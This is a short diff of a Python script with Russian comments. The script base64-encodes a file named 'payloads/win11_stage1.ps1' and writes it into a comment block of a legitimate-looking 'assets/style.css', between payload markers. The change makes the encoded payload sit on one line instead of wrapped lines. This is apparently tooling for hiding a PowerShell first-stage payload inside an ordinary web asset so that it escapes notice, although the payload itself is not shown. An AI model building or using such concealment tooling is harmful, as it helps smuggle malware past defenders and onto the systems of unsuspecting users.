@@ -1,5 +1,4 @@
 import base64
-import textwrap
 
 # Файл с основным payload
 with open("payloads/win11_stage1.ps1", "rb") as f:
@@ -34,13 +33,12 @@ body {
 }
 
 /* [payload_start] */
+/* """ + encoded + """ */
+/* [payload_end] */
 """
-
-css_legit += "/* " + textwrap.fill(encoded, 100) + " */\n"
-css_legit += "/* [payload_end] */\n"
 
 # Сохраняем в style.css
 with open("assets/style.css", "w") as f:
     f.write(css_legit)
 
-print("[+] style.css обновлён с зашитым base64 payload.")
+print("[+] style.css обновлён с зашитым base64 payload (одной строкой).")
